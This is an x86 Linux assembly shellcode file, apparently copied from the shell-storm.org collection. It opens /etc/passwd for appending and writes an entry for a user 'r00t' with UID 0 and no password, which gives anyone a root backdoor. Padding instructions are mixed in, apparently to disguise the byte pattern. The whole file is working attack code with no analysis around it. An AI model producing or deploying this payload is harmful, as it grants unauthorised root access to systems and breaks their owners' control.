; http://shell-storm.org/shellcode/files/shellcode-211.php
; Add root user 'r00t' with no password to /etc/passwd


section .text
	
	global _start

_start:
	xor eax, eax
	xor esi, esi
	push esi
	push 0x64777373
	push 0x61702f2f
	mov al, 5
	push 0x6374652f
	mov ebx, esp
	xor ecx, ecx
	ror edx, 1
	mov cx, 02001Q
	int 0x80
	xor edi, edi
	push eax
	inc esi
	xor eax, eax
	mov al, 4
	dec esi
	pop ebx
	push esi
	mov edi, 0x3a3a3a30
	push edi
	mov edi, 0x3a303a3a
	ror edx, 5
	ror edi, 1
	inc eax
	ror edi,7
	dec eax
	push edi
	xor edx, edx
	mov edx, 0x74303072
	ror edx, 32
	push edx
	mov ecx, esp
	mov dl, 12
	int 0x80
	xor eax, eax
	mul edx
	mov al,6
	int 0x80
	add ecx, 11
	mov al, 1
	int 0x80
